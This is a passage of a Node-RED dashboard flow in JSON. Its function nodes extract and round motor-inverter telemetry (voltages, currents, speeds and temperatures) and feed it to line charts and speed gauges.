        "func": "var sigFigs = 2\n\nvar INV_Ref_Voltage_12_0 =\n{\n    topic: \"INV REF Voltage 12.0 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_12_0\n}\ntry {\n    INV_Ref_Voltage_12_0.payload = INV_Ref_Voltage_12_0.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_5_0 =\n{\n    topic: \"INV REF Voltage 5.0 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_5_0\n}\ntry {\n    INV_Ref_Voltage_5_0.payload = INV_Ref_Voltage_5_0.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Ref_Voltage_2_5 =\n{\n    topic: \"INV REF Voltage 2.5 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_2_5\n}\ntry {\n    INV_Ref_Voltage_2_5.payload = INV_Ref_Voltage_2_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_1_5 =\n{\n    topic: \"INV REF Voltage 1.5 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_1_5\n}\ntry {\n    INV_Ref_Voltage_1_5.payload = INV_Ref_Voltage_1_5.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Ref_Voltage_12_0,\n    INV_Ref_Voltage_5_0,\n    INV_Ref_Voltage_2_5,\n    INV_Ref_Voltage_1_5\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 180,
        "wires": [
            [
                "f997cc1e5bb47b36"
            ],
            [
                "f997cc1e5bb47b36"
            ],
            [
                "f997cc1e5bb47b36"
            ],
            [
                "f997cc1e5bb47b36"
            ]
        ]
    },
    {
        "id": "f997cc1e5bb47b36",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "a75d90dceee57537",
        "name": "Ref Voltages",
        "label": "Reference",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1090,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "af75ab8382707ed5",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "a75d90dceee57537",
        "name": "Feedforward voltages",
        "label": "Feedforward",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1140,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "557b9f4fe55d5ec2",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Feedforward Voltages",
        "func": "var sigFigs = 2\n\nvar INV_Vq_ff =\n{\n    topic: \"INV Vq FF (V)\",\n    payload: msg.payload.INV_Vq_ff\n}\ntry {\n    INV_Vq_ff.payload = INV_Vq_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vd_ff =\n{\n    topic: \"INV Vd FF (V)\",\n    payload: msg.payload.INV_Vd_ff\n}\ntry {\n    INV_Vd_ff.payload = INV_Vd_ff.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Vq_ff,\n    INV_Vd_ff\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 870,
        "y": 280,
        "wires": [
            [
                "af75ab8382707ed5"
            ],
            [
                "af75ab8382707ed5"
            ]
        ]
    },
    {
        "id": "c1163f0b60643b21",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract btwn phase voltages",
        "func": "var sigFigs = 2\n\nvar INV_VBC_Vq_Voltage =\n{\n    topic: \"INV Vbc-Vq Voltage (V)\",\n    payload: msg.payload.INV_VBC_Vq_Voltage\n}\ntry {\n    INV_VBC_Vq_Voltage.payload = INV_VBC_Vq_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VAB_Vd_Voltage =\n{\n    topic: \"INV Vab-Vd Voltage (V)\",\n    payload: msg.payload.INV_VAB_Vd_Voltage\n}\ntry {\n    INV_VAB_Vd_Voltage.payload = INV_VAB_Vd_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_VBC_Vq_Voltage,\n    INV_VAB_Vd_Voltage\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 860,
        "y": 340,
        "wires": [
            [
                "4ad8de1d76e5ae17"
            ],
            [
                "4ad8de1d76e5ae17"
            ]
        ]
    },
    {
        "id": "4ad8de1d76e5ae17",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "a75d90dceee57537",
        "name": "Btwn Phase Voltages",
        "label": "Between Phase",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1140,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "ddd271bcc8f23a90",
        "type": "ui-gauge",
        "z": "bda8997ed28d204b",
        "name": "MC Speed",
        "group": "2073c37afb5d47a4",
        "order": 1,
        "width": 3,
        "height": 3,
        "gtype": "gauge-half",
        "gstyle": "needle",
        "title": "MC Speed",
        "units": "rpm",
        "icon": "",
        "prefix": "",
        "suffix": "",
        "segments": [
            {
                "from": "0",
                "color": "#0f100f"
            }
        ],
        "min": 0,
        "max": "32767",
        "sizeThickness": 16,
        "sizeGap": 4,
        "sizeKeyThickness": 8,
        "styleRounded": true,
        "styleGlow": false,
        "className": "",
        "x": 1150,
        "y": 500,
        "wires": []
    },
    {
        "id": "c851970a511d3634",
        "type": "comment",
        "z": "bda8997ed28d204b",
        "name": "TODO",
        "info": "Can add segments to this guage if desired",
        "x": 1270,
        "y": 500,
        "wires": []
    },
    {
        "id": "2753126cdf2252d4",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Motor Speeds",
        "func": "var sigFigs = 2\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed\",\n    payload: msg.payload.INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Fast_Motor_Speed =\n{\n    topic: \"INV Fast Motor Speed (rpm)\",\n    payload: msg.payload.INV_Fast_Motor_Speed\n}\ntry {\n    INV_Fast_Motor_Speed.payload = INV_Fast_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Motor_Speed,\n    INV_Fast_Motor_Speed\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 860,
        "y": 540,
        "wires": [
            [
                "ddd271bcc8f23a90"
            ],
            [
                "892950a7a1b9c8cc"
            ]
        ]
    },
    {
        "id": "66377126a799b334",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "2073c37afb5d47a4",
        "name": "MC Speed (Graph)",
        "label": "Speed Over Time",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "rpm",
        "yAxisProperty": "INV_Motor_Speed",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": 1,
        "removeOlderUnit": "3600",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 850,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "d2deccf1df4c4799",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract commanded voltages",
        "func": "var sigFigs = 2\n\nvar INV_VBC_Vq_Voltage =\n{\n    topic: \"INV Vbc-Vq Voltage (V)\",\n    payload: msg.payload.INV_VBC_Vq_Voltage\n}\ntry {\n    INV_VBC_Vq_Voltage.payload = INV_VBC_Vq_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VAB_Vd_Voltage =\n{\n    topic: \"INV Vab-Vd Voltage (V)\",\n    payload: msg.payload.INV_VAB_Vd_Voltage\n}\ntry {\n    INV_VAB_Vd_Voltage.payload = INV_VAB_Vd_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_VBC_Vq_Voltage,\n    INV_VAB_Vd_Voltage\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 860,
        "y": 380,
        "wires": [
            [
                "85d2f3df1f695cbd"
            ],
            [
                "85d2f3df1f695cbd"
            ]
        ]
    },
    {
        "id": "85d2f3df1f695cbd",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "a75d90dceee57537",
        "name": "Command Voltages",
        "label": "Commanded",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1130,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "892950a7a1b9c8cc",
        "type": "ui-gauge",
        "z": "bda8997ed28d204b",
        "name": "Motor Speed Max",
        "group": "2073c37afb5d47a4",
        "order": 2,
        "width": 3,
        "height": 3,
        "gtype": "gauge-half",
        "gstyle": "needle",
        "title": "Motor Speed MAX",
        "units": "rpm",
        "icon": "",
        "prefix": "",
        "suffix": "",
        "segments": [
            {
                "from": "0",
                "color": "#0f100f"
            }
        ],
        "min": 0,
        "max": "32767",
        "sizeThickness": 16,
        "sizeGap": 4,
        "sizeKeyThickness": 8,
        "styleRounded": true,
        "styleGlow": false,
        "className": "",
        "x": 1170,
        "y": 540,
        "wires": []
    },
    {
        "id": "d860a06f83f452b9",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Motor Temps",
        "func": "var sigFigs = 2\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload.INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Hot_Spot_Temp =\n{\n    topic: \"INV Hot Spot Temperature (ºC)\",\n    payload: msg.payload.INV_Hot_Spot_Temp\n}\ntry {\n    INV_Hot_Spot_Temp.payload = INV_Hot_Spot_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_COOLANT_TEMPERATURE =\n{\n    topic: \"INV Coolant Temperature\",\n    payload: msg.payload.inv_coolant_temperature\n}\ntry {\n    INV_COOLANT_TEMPERATURE.payload = INV_COOLANT_TEMPERATURE.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Motor_Temp,\n    INV_Hot_Spot_Temp,\n    INV_COOLANT_TEMPERATURE,\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 880,
        "wires": [
            [
                "7f8b0b754e88a6d7"
            ],
            [
                "7f8b0b754e88a6d7"
            ],
            [
                "7f8b0b754e88a6d7"
            ]
        ]
    },
    {
        "id": "a69c8feea8c6bcfe",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract RTD Input Temps",
        "func": "var sigFigs = 2\n\nvar INV_RTD2_Temperature =\n{\n    topic: \"INV rtd2 Temperature (ºC)\",\n    payload: msg.payload.INV_RTD2_Temperature\n}\ntry {\n    INV_RTD2_Temperature.payload = INV_RTD2_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD1_Temperature =\n{\n    topic: \"INV rtd1 Temperature (ºC)\",\n    payload: msg.payload.INV_RTD1_Temperature\n}\ntry {\n    INV_RTD1_Temperature.payload = INV_RTD1_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_RTD1_Temperature,\n    INV_RTD2_Temperature\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 680,
        "wires": [
            [
                "5e9c7ea196c471d3"
            ],
            [
                "5e9c7ea196c471d3"
            ]
        ]
    },
    {
        "id": "68ca2255ec5ef83f",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Board Temps",
        "func": "var sigFigs = 2\n\nvar INV_Control_Board_Temp =\n{\n    topic: \"INV Control Board Temperature (ºC)\",\n    payload: msg.payload.INV_Control_Board_Temp\n}\ntry {\n    INV_Control_Board_Temp.payload = INV_Control_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Gate_Driver_Board_Temp =\n{\n    topic: \"INV Gate Driver Board Temperature (ºC)\",\n    payload: msg.payload.INV_Gate_Driver_Board_Temp\n}\ntry {\n    INV_Gate_Driver_Board_Temp.payload = INV_Gate_Driver_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Control_Board_Temp,\n    INV_Gate_Driver_Board_Temp\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 740,
        "wires": [
            [
                "8cad0968feded9b2"
            ],
            [
                "8cad0968feded9b2"
            ]
        ]
    },
    {
        "id": "efd9825c65b14baf",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Module Temps",
        "func": "var sigFigs = 2\n\nvar INV_Module_C_Temp =\n{\n    topic: \"INV Module C Temperature (ºC)\",\n    payload: msg.payload.INV_Module_C_Temp\n}\ntry {\n    INV_Module_C_Temp.payload = INV_Module_C_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_B_Temp =\n{\n    topic: \"INV Module B Temperature (ºC)\",\n    payload: msg.payload.INV_Module_B_Temp\n}\ntry {\n    INV_Module_B_Temp.payload = INV_Module_B_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_A_Temp =\n{\n    topic: \"INV Module A Temperature (ºC)\",\n    payload: msg.payload.INV_Module_A_Temp\n}\ntry {\n    INV_Module_A_Temp.payload = INV_Module_A_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Module_A_Temp,\n    INV_Module_B_Temp,\n    INV_Module_C_Temp\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 800,
        "wires": [
            [
                "b6b9a0cd723a0ef6"
            ],
            [
                "b6b9a0cd723a0ef6"
            ],
            [
                "b6b9a0cd723a0ef6"
            ]
        ]
    },
    {
        "id": "5e9c7ea196c471d3",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "c7b7c4786c54ce6f",
        "name": "RTD Input Temps",
        "label": "RTD Input",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1170,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "8cad0968feded9b2",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "c7b7c4786c54ce6f",
        "name": "Board Temps",
        "label": "Boards",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1150,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "b6b9a0cd723a0ef6",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "c7b7c4786c54ce6f",
        "name": "Module Temps",
        "label": "Modules",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1160,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "7f8b0b754e88a6d7",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "c7b7c4786c54ce6f",
        "name": "Motor Temps",
        "label": "General",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1150,
        "y": 880,
        "wires": [
            []
        ]
    },
    {
        "id": "56d3c93f4005e399",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Phase Currents",
        "func": "var sigFigs = 2\n\nvar INV_Phase_C_Current =\n{\n    topic: \"INV Phase C Current (A)\",\n    payload: msg.payload.INV_Phase_C_Current\n}\ntry {\n    INV_Phase_C_Current.payload = INV_Phase_C_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Phase_B_Current =\n{\n    topic: \"INV Phase B Current (A)\",\n    payload: msg.payload.INV_Phase_B_Current\n}\ntry {\n    INV_Phase_B_Current.payload = INV_Phase_B_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_A_Current =\n{\n    topic: \"INV Phase A Current (A)\",\n    payload: msg.payload.INV_Phase_A_Current\n}\ntry {\n    INV_Phase_A_Current.payload = INV_Phase_A_Current.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Phase_A_Current,\n    INV_Phase_B_Current,\n    INV_Phase_C_Current\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 1020,
        "wires": [
            [
                "d6c91ce53cb6c3fa"
            ],
            [
                "d6c91ce53cb6c3fa"
            ],
            [
                "d6c91ce53cb6c3fa"
            ]
        ]
    },
    {
        "id": "c830897274863c4b",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Iq/Id Currents",
        "func": "var sigFigs = 2\n\nvar INV_Iq =\n{\n    topic: \"INV Iq (A)\",\n    payload: msg.payload.INV_Iq\n}\ntry {\n    INV_Iq.payload = INV_Iq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Id =\n{\n    topic: \"INV Id (A)\",\n    payload: msg.payload.INV_Id\n}\ntry {\n    INV_Id.payload = INV_Id.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Iq,\n    INV_Id\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 1100,
        "wires": [
            [
                "a6358c144b332f75"
            ],
            [
                "a6358c144b332f75"
            ]
        ]
    },
    {
        "id": "7bd08d25b2b041f8",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Diagnostic Phase Currents",
        "func": "var sigFigs = 2\n\nvar INV_Diag_Ia =\n{\n    topic: \"INV Diag Ia A\",\n    payload: msg.payload.INV_Diag_Ia\n}\ntry {\n    INV_Diag_Ia.payload = INV_Diag_Ia.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ib =\n{\n    topic: \"INV Diag Ib (A)\",\n    payload: msg.payload.INV_Diag_Ib\n}\ntry {\n    INV_Diag_Ib.payload = INV_Diag_Ib.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ic =\n{\n    topic: \"INV Diag Ic (A)\",\n    payload: msg.payload.INV_Diag_Ic\n}\ntry {\n    INV_Diag_Ic.payload = INV_Diag_Ic.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    INV_Diag_Ia,\n    INV_Diag_Ib,\n    INV_Diag_Ic\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 880,
        "y": 1160,
        "wires": [
            [
                "73e319f2015a7131"
            ],
            [
                "73e319f2015a7131"
            ],
            [
                "73e319f2015a7131"
            ]
        ]
    },
    {
        "id": "606b0b3234cf3275",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Commanded Currents",
        "func": "var sigFigs = 2\n\nvar INV_Diag_Iq_cmd =\n{\n    topic: \"INV Diag Iq CMD (A)\",\n    payload: msg.payload.INV_Diag_Iq_cmd\n}\ntry {\n    INV_Diag_Iq_cmd.payload = INV_Diag_Iq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Id_cmd =\n{\n    topic: \"INV Diag Id CMD (A)\",\n    payload: msg.payload.INV_Diag_Id_cmd\n}\ntry {\n    INV_Diag_Id_cmd.payload = INV_Diag_Id_cmd.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Diag_Id_cmd,\n    INV_Diag_Iq_cmd\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 870,
        "y": 1220,
        "wires": [
            [
                "b8c357acb2351c18"
            ],
            [
                "b8c357acb2351c18"
            ]
        ]
    },
    {
        "id": "a6358c144b332f75",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Iq/Id Currents",
        "label": "Iq/Id",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1160,
        "y": 1100,
        "wires": [
            []
        ]
    },
    {
        "id": "d6c91ce53cb6c3fa",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Phase Currents",
        "label": "Phase",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
